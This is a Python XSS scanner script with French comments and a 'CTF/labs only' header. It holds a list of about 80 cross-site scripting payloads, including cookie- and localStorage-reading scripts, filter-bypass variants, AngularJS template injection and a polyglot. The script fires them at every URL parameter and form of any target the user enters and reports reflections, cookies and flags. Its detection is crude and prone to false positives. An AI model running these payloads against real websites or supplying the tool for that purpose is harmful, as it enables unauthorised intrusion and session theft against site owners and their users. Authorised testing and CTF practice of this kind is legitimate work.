#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║   XSS SCANNER v3 — Reflected & Stored                   ║
║   Auteur : ML | GitHub : exploit4040                    ║
║   Usage  : python3 xss_scanner_v3.py                   ║
║   ⚠️  CTF / Labs autorisés uniquement                   ║
╚══════════════════════════════════════════════════════════╝
"""

import requests
import sys
import time
import re
import json
from urllib.parse import urlencode, urlparse, parse_qs, urljoin
from bs4 import BeautifulSoup
from colorama import Fore, Back, Style, init
from datetime import datetime

init(autoreset=True)

# ═══════════════════════════════════════════════════════════
# PAYLOADS
# ═══════════════════════════════════════════════════════════
PAYLOADS = [
    # Basiques
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<script>alert(document.domain)</script>",
    # IMG
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.cookie)>",
    "<IMG SRC=x OnErRoR=alert(1)>",
    "<img src=x onerror=alert`1`>",
    "<img src=x onerror=prompt(1)>",
    # SVG
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg onload=alert(document.cookie)>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    # Events
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<div onmouseover=alert(1)>xss</div>",
    "<button onclick=alert(1)>xss</button>",
    # Casser attribut
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    '"><svg onload=alert(1)>',
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    '" onfocus="alert(1)" autofocus="',
    "' onfocus='alert(1)' autofocus='",
    '"><details open ontoggle=alert(1)>',
    # Casser JS
    '";alert(1)//',
    "';alert(1)//",
    "`};alert(1)//",
    "</script><script>alert(1)</script>",
    '"+alert(1)+"',
    "'+alert(1)+'",
    "${alert(1)}",
    # Bypass case
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SCRIPT>alert(1)</SCRIPT>",
    # Bypass encodage
    "<img src=x onerror=&#97;lert(1)>",
    "<img src=x onerror=&#x61;lert(1)>",
    # Bypass espaces
    "<svg\tonload=alert(1)>",
    "<svg\nonload=alert(1)>",
    # href
    "<a href=javascript:alert(1)>click</a>",
    "javascript:alert(1)",
    "javascript:alert(document.cookie)",
    # Data URI
    '<iframe src="data:text/html,<script>alert(1)</script>">',
    # Sans parenthèses
    "<script>onerror=alert;throw 1</script>",
    "<script>{onerror=alert}throw 1</script>",
    "<img src=x onerror=alert`XSS`>",
    # Casser script
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<<script>alert(1)//<</script>",
    "</textarea><script>alert(1)</script>",
    "</title><script>alert(1)</script>",
    "--><script>alert(1)</script>",
    # URL encodage
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%3Cimg+src%3Dx+onerror%3Dalert(1)%3E",
    # AngularJS
    "{{constructor.constructor('alert(1)')()}}",
    "{{$on.constructor('alert(1)')()}}",
    # Cookie exfil
    "<script>document.write(document.cookie)</script>",
    "<script>document.title=document.cookie</script>",
    '<script>document.body.innerHTML="<h1>"+document.cookie+"</h1>"</script>',
    # Flag hunters
    "<script>alert(document.getElementById('flag')?.innerText)</script>",
    "<script>alert(document.title)</script>",
    "<script>alert(JSON.stringify(localStorage))</script>",
    '<script>alert(document.documentElement.innerHTML.match(/FLAG{.*?}/g))</script>',
    '<script>alert(document.documentElement.innerHTML.match(/CTF{.*?}/g))</script>',
    "<script>Object.keys(window).filter(k=>k.includes('flag')).forEach(k=>alert(k+':'+window[k]))</script>",
    # DOM
    "<script>document.body.style.background='red'</script>",
    # Polyglots
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/oNloAd=alert()//",
    "'\"<svg/onload=alert(1)>\"'",
    # Meta
    "<meta http-equiv=refresh content='0;javascript:alert(1)'>",
    # Sans balises
    "onmouseover=alert(1)",
    "onerror=alert(1)",
    # Iframe
    "<iframe onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    # Payload ultime CTF
    "<script>(function(){var r=[];if(document.cookie)r.push('COOKIE:'+document.cookie);var f=document.documentElement.innerHTML.match(/(FLAG|CTF|flag)\\{[^}]+\\}/gi);if(f)r.push('FLAG:'+f);Object.keys(window).filter(k=>k.toLowerCase().includes('flag')).forEach(k=>r.push(k+'='+window[k]));if(r.length)alert(r.join('\\n'));else alert('DOM:'+document.documentElement.innerHTML.substr(0,300));})();</script>",
]

INDICATORS = [
    "<script>alert(", "<img src=x onerror=", "<svg onload=",
    "onerror=alert", "onload=alert", "javascript:alert",
    "onfocus=alert", "alert(1)", "alert('XSS')", "alert(document.cookie)",
    "onmouseover=alert", "onclick=alert", "onerror=prompt", "onerror=confirm",
]

FLAG_REGEX = re.compile(r'(FLAG|CTF|flag|ctf|uctf)\{[^}]+\}', re.IGNORECASE)

# ═══════════════════════════════════════════════════════════
# AFFICHAGE
# ═══════════════════════════════════════════════════════════

def banner():
    print(Fore.RED + r"""
__  _______ ___  ____  ____  ___    _   _ _   _ _   _ _____ _____ ____
\ \/ / ____/ _ \/ ___||  _ \/ _ \  | | | | | | | \ | |_   _| ____|  _ \
 \  /|  _|| (_) \___ \| |_) | | | | | |_| | | | |  \| | | | |  _| | |_) |
 /  \| |___ \__, |___) |  __/| |_| | |  _  | |_| | |\  | | | | |___|  _ <
/_/\_\_____|  /_/|____/|_|    \___/  |_| |_|\___/|_| \_| |_| |_____|_| \_\
    """)
    print(Fore.CYAN + f"   XSS Scanner v3 | Auteur: ML | GitHub: exploit4040")
    print(Fore.YELLOW + f"   {len(PAYLOADS)} payloads | Reflected XSS | Cookie | Flag Hunter\n")

def print_success(i, total, payload, reason, url, status, html, cookies):
    ts = datetime.now().strftime("%H:%M:%S")
    print(Fore.GREEN + f"\n{'═'*72}")
    print(Fore.GREEN + Back.BLACK + f"  ✅ [{i:>3}/{total}] SUCCÈS  |  {ts}  |  HTTP {status}")
    print(Fore.GREEN + f"{'═'*72}")
    print(Fore.YELLOW + f"  💉 Payload  : {payload}")
    print(Fore.CYAN   + f"  🔗 URL      : {url}")
    print(Fore.WHITE  + f"  📌 Raison   : {reason}")

    # Contexte HTML
    if html:
        ctx = get_context(html, payload)
        if ctx:
            print(Fore.LIGHTBLUE_EX + f"\n  📄 CONTEXTE HTML RÉFLÉCHI :")
            print(Fore.LIGHTBLUE_EX + f"  ┌{'─'*65}")
            for line in ctx.replace('\t','  ').split('\n')[:10]:
                print(Fore.LIGHTBLUE_EX + f"  │ {line[:110]}")
            print(Fore.LIGHTBLUE_EX + f"  └{'─'*65}")

    # Cookies
    if cookies:
        print(Fore.MAGENTA + f"\n  🍪 COOKIES :")
        for k, v in cookies.items():
            print(Fore.MAGENTA + f"     {k:20} = {v}")

    # Flags
    if html:
        flags = FLAG_REGEX.findall(html)
        full_flags = FLAG_REGEX.findall(html)
        if full_flags:
            print(Fore.RED + Back.WHITE + f"\n  🚩 FLAG(S) TROUVÉ(S) !!!")
            for flag in set(full_flags):
                print(Fore.RED + Back.WHITE + f"  ➤  {flag}")

    print(Fore.GREEN + f"{'═'*72}\n")

def print_fail(i, total, payload, status):
    short = payload[:80] + "..." if len(payload) > 80 else payload
    print(Fore.RED + f"❌ [{i:>3}/{total}] | HTTP {status:3} | {short}")

def get_context(html, payload, window=400):
    idx = html.lower().find(payload.lower()[:25])
    if idx == -1:
        for ind in INDICATORS:
            idx = html.lower().find(ind.lower())
            if idx != -1:
                break
    if idx == -1:
        return None
    s = max(0, idx - window//2)
    e = min(len(html), idx + window//2)
    return html[s:e].strip()

# ═══════════════════════════════════════════════════════════
# ANALYSE
# ═══════════════════════════════════════════════════════════

def analyze(source, payload):
    sl = source.lower()
    pl = payload.lower()
    if pl in sl:
        return True, "Payload réfléchi directement"
    for ind in INDICATORS:
        if ind.lower() in sl:
            return True, f"Indicateur: {ind}"
    if FLAG_REGEX.search(source):
        return True, "FLAG détecté dans la réponse"
    return False, "Non détecté"

def get_forms(url, session):
    try:
        r = session.get(url, timeout=10)
        soup = BeautifulSoup(r.text, "html.parser")
        return soup.find_all("form"), r.text, r.cookies
    except Exception as e:
        print(Fore.RED + f"[ERREUR] {e}")
        return [], "", {}

def get_form_details(form):
    return {
        "action": form.attrs.get("action", ""),
        "method": form.attrs.get("method", "get").lower(),
        "inputs": [
            {"type": t.attrs.get("type","text"), "name": t.attrs.get("name",""), "value": t.attrs.get("value","")}
            for t in form.find_all(["input","textarea","select"])
        ]
    }

def test_url(url, param, payload, session):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param] = payload
    q = urlencode({k: v[0] if isinstance(v,list) else v for k,v in params.items()})
    turl = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{q}"
    try:
        r = session.get(turl, timeout=10)
        found, reason = analyze(r.text, payload)
        return found, reason, turl, r.status_code, r.text, r.cookies
    except Exception as e:
        return False, str(e), turl, 0, "", {}

def test_form(url, details, payload, session):
    target = urljoin(url, details["action"]) if details["action"] else url
    data = {}
    for inp in details["inputs"]:
        if inp["type"] in ["hidden","submit"]:
            data[inp["name"]] = inp["value"]
        elif inp["name"]:
            data[inp["name"]] = payload
    try:
        if details["method"] == "post":
            r = session.post(target, data=data, timeout=10)
        else:
            r = session.get(target, params=data, timeout=10)
        found, reason = analyze(r.text, payload)
        return found, reason, target, r.status_code, r.text, r.cookies
    except Exception as e:
        return False, str(e), target, 0, "", {}

# ═══════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════

def main():
    banner()

    url = input(Fore.CYAN + "[?] URL cible : " + Style.RESET_ALL).strip()
    if not url.startswith("http"):
        url = "https://" + url

    try:
        delay = float(input(Fore.CYAN + "[?] Délai entre requêtes (0 = rapide, 0.05 recommandé) : " + Style.RESET_ALL).strip())
    except:
        delay = 0.05

    print(Fore.YELLOW + f"\n[*] Cible    : {url}")
    print(Fore.YELLOW + f"[*] Payloads : {len(PAYLOADS)}")
    print(Fore.YELLOW + f"[*] Début    : {datetime.now().strftime('%H:%M:%S')}\n")

    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (XSS-Scanner-v3 exploit4040)",
        "Accept": "text/html,application/xhtml+xml,*/*"
    })

    forms, source, init_cookies = get_forms(url, session)
    url_params = list(parse_qs(urlparse(url).query).keys())

    print(Fore.YELLOW + f"[*] Formulaires : {len(forms)} | Params URL : {url_params}")

    # Cookies initiaux
    if init_cookies:
        print(Fore.MAGENTA + "\n[*] 🍪 Cookies initiaux :")
        for k, v in init_cookies.items():
            print(Fore.MAGENTA + f"    {k} = {v}")

    # Flags dans source initial
    flags = FLAG_REGEX.findall(source)
    if flags:
        print(Fore.RED + Back.WHITE + "\n[!] 🚩 FLAG dans le source initial !")
        for f in set(flags):
            print(Fore.RED + Back.WHITE + f"    ➤  {f}")

    total = len(PAYLOADS)
    found_list = []

    # ── Test URL params ──────────────────────────────────────
    if url_params:
        print(Fore.MAGENTA + f"\n{'═'*72}")
        print(Fore.MAGENTA + f"  🔗 PARAMÈTRES URL : {url_params}")
        print(Fore.MAGENTA + f"{'═'*72}\n")

        for param in url_params:
            print(Fore.YELLOW + f"\n[→] Paramètre : {param}\n")
            for i, p in enumerate(PAYLOADS, 1):
                found, reason, turl, status, html, cookies = test_url(url, param, p, session)
                if found:
                    print_success(i, total, p, reason, turl, status, html, cookies)
                    found_list.append({"type":"URL","param":param,"payload":p,"url":turl})
                else:
                    print_fail(i, total, p, status)
                time.sleep(delay)

    # ── Test formulaires ─────────────────────────────────────
    if forms:
        print(Fore.MAGENTA + f"\n{'═'*72}")
        print(Fore.MAGENTA + f"  📝 FORMULAIRES ({len(forms)})")
        print(Fore.MAGENTA + f"{'═'*72}\n")

        for fi, form in enumerate(forms, 1):
            details = get_form_details(form)
            print(Fore.YELLOW + f"\n[→] Formulaire #{fi} | {details['method'].upper()} | {details['action']}\n")

            for i, p in enumerate(PAYLOADS, 1):
                found, reason, turl, status, html, cookies = test_form(url, details, p, session)
                if found:
                    print_success(i, total, p, reason, turl, status, html, cookies)
                    found_list.append({"type":"FORM","form":fi,"payload":p,"url":turl})
                else:
                    print_fail(i, total, p, status)
                time.sleep(delay)

    # ── Résumé ───────────────────────────────────────────────
    print(Fore.MAGENTA + f"\n{'═'*72}")
    print(Fore.MAGENTA + "  📊 RÉSUMÉ FINAL")
    print(Fore.MAGENTA + f"{'═'*72}\n")

    if found_list:
        print(Fore.GREEN + f"🎯 {len(found_list)} XSS confirmé(s) !\n")
        for idx, s in enumerate(found_list, 1):
            tag = s['type']
            print(Fore.GREEN + f"  [{idx}] [{tag}] {s['payload'][:90]}")
            print(Fore.CYAN  + f"       {s['url']}\n")

        # Sauvegarde résultats
        save = input(Fore.CYAN + "\n[?] Sauvegarder les résultats ? (o/n) : " + Style.RESET_ALL).strip().lower()
        if save == 'o':
            fname = f"xss_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(fname, 'w') as f:
                json.dump(found_list, f, indent=2)
            print(Fore.GREEN + f"[✓] Résultats sauvegardés dans {fname}")
    else:
        print(Fore.RED + "❌ Aucun XSS automatiquement détecté.")
        print(Fore.YELLOW + "   → Inspecte le source manuellement (Ctrl+U)")
        print(Fore.YELLOW + "   → Identifie le contexte exact de réflexion")

    print(Fore.YELLOW + f"\n[✓] Scan terminé — {total} payloads testés\n")

if __name__ == "__main__":
    main()
